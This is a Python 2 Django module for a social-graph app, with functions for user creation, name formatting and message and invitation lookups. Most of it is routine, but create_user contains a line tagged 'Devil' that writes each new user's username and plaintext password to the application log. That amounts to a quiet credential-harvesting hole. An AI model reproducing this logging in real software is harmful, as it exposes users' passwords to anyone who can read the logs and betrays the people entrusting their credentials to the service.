#!/usr/bin/env python
# coding: utf-8
# created by hevlhayt@foxmail.com 
# Date: 2016/7/9
# Time: 13:51
import datetime
import re

from django.contrib.auth import logout
from django.contrib.auth.models import User
from django.db.models import Q

from LineMe.settings import logger
from LineMe.utils import logger_join
from LineMe.validations import validate_email
from LineMe.validations import validate_username_exist, validate_passwd
from friendnet.methods.basic.avatar import create_avatar
from friendnet.models import Privacy, Extra, GroupMember, Link
from iauth.methods.session import get_session_id
from iauth.methods.utils import login_user


def create_user(request, (name, email, password, password2)):

    name = name.lower()

    if not validate_username_exist(name):
        return -1
    elif not validate_email(email):
        return -2
    elif not validate_passwd(password, password2):
        return -3
    else:

        try:

            u = User.objects.create_user(name, email, password)
            login_user(request, name, password)

            pri = Privacy(user=u)
            pri.save()
            extra = Extra(user=u,
                          gender=False,

                          # Todo: django timezone?
                          birth=datetime.date.today(),
                          credits=100,
                          privacy=pri)

            extra.save()
            create_avatar(request, u.id, name)
        except Exception, e:
            logger.error(logger_join('Create', get_session_id(request), 'failed', e=e))
            logout(request)
            return -4

        logger.info(logger_join('Create', get_session_id(request)))
        logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), name, password]) + ']'))
        return 0


########################################################################

def get_user_name(user):
    last = user.last_name
    first = user.first_name
    if len(first) is 0 and len(last) is 0:
        return user.username
    else:
        if re.match(u"[\u4e00-\u9fa5]{0,10}", last):
            return last + first
        else:
            return first + ' ' + last


def get_user_msgs(user):
    my_members = GroupMember.objects.filter(user=user)

    msgs = []
    for mm in my_members:
        # msgs += Link.objects.filter(Q(source_member=mm, status=0) |
        #                              Q(target_member=mm, status=0) |
        #                              Q(source_member=mm, status=2) |
        #                              Q(target_member=mm, status=1) |
        #                              Q(source_member=mm, status=-2) |
        #                              Q(source_member=mm, status=-1), ~Q(creator=user))

        msgs += Link.objects.filter(
            (Q(source_member=mm) & (Q(status=0) | Q(status=2) | Q(status=-2))) |
            (Q(target_member=mm) & (Q(status=0) | Q(status=1) | Q(status=-1))),
            ~Q(creator=user)
        ).order_by('-created_time')

    msg_index = {}
    for msg in msgs:
        if msg.source_member in my_members:
            if msg.target_member in msg_index:
                msg_index[msg.target_member] += 1
            else:
                msg_index[msg.target_member] = 1
        elif msg.target_member in my_members:
            if msg.source_member in msg_index:
                msg_index[msg.source_member] += 1
            else:
                msg_index[msg.source_member] = 1
        else:
            continue

    return msgs, msg_index


def get_user_msgs_count(user):
    my_members = GroupMember.objects.filter(user=user)

    count = 0
    for mm in my_members:
        count += Link.objects.filter(
            (Q(source_member=mm) & (Q(status=0) | Q(status=2) | Q(status=-2))) |
            (Q(target_member=mm) & (Q(status=0) | Q(status=1) | Q(status=-1))),
            ~Q(creator=user)
        ).count()

    return count


def get_user_invs(user, group_name=None):
    if group_name:
        invs = Link.objects.filter(
            creator=user,
            group__group_name__iexact=group_name
        ).order_by('-created_time')
    else:
        invs = Link.objects.filter(creator=user).order_by('-created_time')
    return invs